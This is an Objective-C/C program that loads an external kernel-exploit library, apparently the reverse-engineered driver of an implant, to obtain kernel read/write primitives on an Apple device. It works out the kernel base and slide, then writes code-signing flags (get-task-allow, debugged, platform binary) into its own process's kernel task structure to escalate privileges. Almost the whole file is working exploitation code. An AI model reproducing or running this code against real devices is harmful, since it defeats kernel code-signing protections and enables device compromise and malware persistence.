@import Darwin;
@import MachO;
@import Foundation;
#import "defs.h"

#define CS_GET_TASK_ALLOW           0x00000004  /* has get-task-allow entitlement */
#define CS_HARD                     0x00000100  /* don't load invalid pages */
#define CS_KILL                     0x00000200  /* kill process if it becomes invalid */
#define CS_PLATFORM_BINARY          0x04000000    /* this is a platform binary */
#define CS_DEBUGGED                 0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */

#define DRIVER_CMD_TASK_CSFLAGS_MARK_VALID 12
#define DRIVER_CMD_TASK_CSFLAGS_JIT_ENABLE 15
#define DRIVER_CMD_TASK_CSFLAGS_JIT_DISABLE 19
#define DRIVER_CMD_TASK_GET_ROOT 26
#define DRIVER_CMD_TASK_FOR_PID 0xc000001d

typedef struct_krwCtx krw_ctx_t;
typedef struct module_vtable module_vtable_t;
typedef int (*driver_init_t)(module_vtable_t *vtable, uint64_t arg1, krw_ctx_t **ctx_out);
typedef int (*driver_free_t)(module_vtable_t *vtable);
typedef int (*driver_close_t)(module_vtable_t *vtable, krw_ctx_t *ctx);
typedef uint64_t (*driver_dispatch_command_t)(module_vtable_t *vtable, krw_ctx_t *ctx, uint64_t cmd, void *args);
typedef struct module_vtable {
    /* +0x00 */ uint16_t version;              /* must be 2 */
    /* +0x02 */ uint16_t num_funcs;            /* must be >= 2 */
    /* +0x04 */ uint32_t _pad;
    /* +0x08 */ void *context;                 /* back-pointer to implant_ctx */
    /* +0x10 */ driver_free_t free;            /* deinit (0x12dfc) */
    /* +0x18 */ driver_init_t init;/* init (0x12e3c) */
    /* +0x20 */ driver_close_t close;            /* 0x12e58 */
    /* +0x28 */ driver_dispatch_command_t dispatch_command;            /* 0x12e74 */
    /* +0x30 */ void *trampoline_4;            /* 0x12e90 */
    /* +0x38 */ void *trampoline_5;            /* 0x12eac */
    /* +0x40 */ void *trampoline_6;            /* 0x12ec8 */
    /* +0x48 */ void *trampoline_7;            /* 0x12ee4 */
} module_vtable_t;
typedef int (*driver_fn_t)(module_vtable_t **);

typedef int (*driver_kreadbuf)(void *ctx, uint64_t address, mach_vm_size_t size, void *valueOut);
typedef int (*driver_kwritebuf)(void *ctx, uint64_t address, const void *value, mach_vm_size_t size);
typedef uint64_t (*driver_task_csflags_kaddr)(krw_ctx_t *ctx, mach_port_t task_port);
krw_ctx_t *global_ctx;
driver_kreadbuf kread_buf_internal;
driver_kwritebuf kwrite_buf_internal;
uint64_t kernelbase, slide;

int kreadbuf(uint64_t addr, void *data, size_t size) {
    kread_buf_internal(global_ctx, addr, size, data);
//    NSLog(@"kreadbuf addr=0x%llx size=%zu", addr, size);
//
//    uint8_t *bytes = data;
//    NSMutableString *hex = [NSMutableString string];
//
//    for (size_t i = 0; i < size; i++) {
//        [hex appendFormat:@"%02x ", bytes[i]];
//    }
//
//    NSLog(@"data: %@", hex);
    
    return 0;
}
int kwritebuf(uint64_t addr, const void *data, size_t size) {
    kwrite_buf_internal(global_ctx, addr, data, size);
//    
//    NSLog(@"kwritebuf addr=0x%llx size=%zu", addr, size);
//
//    uint8_t *bytes = data;
//    NSMutableString *hex = [NSMutableString string];
//
//    for (size_t i = 0; i < size; i++) {
//        [hex appendFormat:@"%02x ", bytes[i]];
//    }
//
//    NSLog(@"data: %@", hex);
    
    return 0;
}

//uint64_t kread_ptr(uint64_t addr) {
//    uint64_t ptr = 0;
//    kread_ptr_internal(global_ctx, addr, &ptr);
//    return ptr;
//}

uint8_t kread8(uint64_t addr) {
    uint8_t value = 0;
    kreadbuf(addr, &value, 1);
    return value;
}

uint16_t kread16(uint64_t addr) {
    uint16_t value = 0;
    kreadbuf(addr, &value, 2);
    return value;
}

uint32_t kread32(uint64_t addr) {
    uint32_t value = 0;
    kreadbuf(addr, &value, 4);
    return value;
}

uint64_t kread64(uint64_t addr) {
    uint64_t value = 0;
    kreadbuf(addr, &value, 8);
    return value;
}

void kwrite8(uint64_t addr, uint8_t value) {
    kwritebuf(addr, &value, 1);
}

void kwrite16(uint64_t addr, uint16_t value) {
    kwritebuf(addr, &value, 2);
}

void kwrite32(uint64_t addr, uint32_t value) {
    kwritebuf(addr, &value, 4);
}

void kwrite64(uint64_t addr, uint64_t value) {
    kwritebuf(addr, &value, 8);
}


int csops(int, int, void*, int);
int main(int argc, char *argv[], char *envp[]) {
    
    void *handle = //dlopen("@loader_path/kernel_exploit.dylib", RTLD_GLOBAL);
    dlopen("@loader_path/entry1_type0x09.dylib", RTLD_GLOBAL);
    if(!handle) {
        fprintf(stderr, "dlopen failed: %s\n", dlerror());
        return 1;
    }
    kread_buf_internal = (driver_kreadbuf)dlsym(handle, "krw_read_thunk");
    kwrite_buf_internal = (driver_kwritebuf)dlsym(handle, "kwritebuf_universal");
    if (!kread_buf_internal || !kwrite_buf_internal) {
        fprintf(stderr, "dlsym rw failed: %s\n", dlerror());
        return 1;
    }
    
    driver_fn_t driver_fn = (driver_fn_t)dlsym(handle, "driver");
    if (!driver_fn) {
        fprintf(stderr, "dlsym failed: %s\n", dlerror());
        return 1;
    }
    
    module_vtable_t *vtable_out = NULL;
    int dr = driver_fn(&vtable_out);
    if (dr != 0 || !vtable_out) {
        fprintf(stderr, "driver_fn failed: %d\n", dr);
        return 1;
    }
    
    // init
    dr = vtable_out->init(vtable_out, 0, &global_ctx);
    if (!global_ctx) {
        fprintf(stderr, "driver->init failed: %d\n", dr);
        return 1;
    }
    printf("Driver initialized, ctx: %p\n", global_ctx);
    
    
    //printf("slideMaybe=0x%llx\n", global_ctx->slideMaybe);
    
    kernelbase = global_ctx->machHeaderPlus0x8000 - 0x8000;
    slide = kernelbase - 0xfffffff007004000;
    
    printf("kernel base: 0x%llx\n", kernelbase);
    printf("kernel slide: 0x%llx\n", slide);
    uint64_t val = kread64(kernelbase);
    printf("Kernel header: 0x%llx\n", val);
    
    // CS_DEBUGGED|CS_VALID
    int pid = getpid();
    struct { int32_t pid; mach_port_t port; } args = { .pid = pid };
    vtable_out->dispatch_command(vtable_out, global_ctx, DRIVER_CMD_TASK_FOR_PID, &args);

    uint32_t flags;
    csops(pid, 0, &flags, sizeof(flags));
    printf("csops before modify: 0x%x\n", flags);
    
    driver_task_csflags_kaddr task_csflags_kaddr = (driver_task_csflags_kaddr)dlsym(handle, "get_task_csflags_kaddr");
    if (!task_csflags_kaddr) {
        fprintf(stderr, "dlsym task_csflags_kaddr failed: %s\n", dlerror());
        return 1;
    }
    uint64_t addr = task_csflags_kaddr(global_ctx, args.port);
    flags = kread32(addr);
    printf("csops read from krw: 0x%x\n", flags);
    
    //flags &= ~(CS_KILL | CS_HARD);
    flags |= CS_GET_TASK_ALLOW | CS_DEBUGGED | CS_PLATFORM_BINARY;
    printf("writing: 0x%x\n", flags);
    
    kwrite32(addr, flags);
    //vtable_out->dispatch_command(vtable_out, global_ctx, DRIVER_CMD_TASK_CSFLAGS_JIT_ENABLE, (void *)args.port);
    
    csops(pid, 0, &flags, sizeof(flags));
    printf("csops after modify: 0x%x\n", flags);
    
    // de-init
    vtable_out->close(vtable_out, global_ctx);
    vtable_out->free(vtable_out);
}
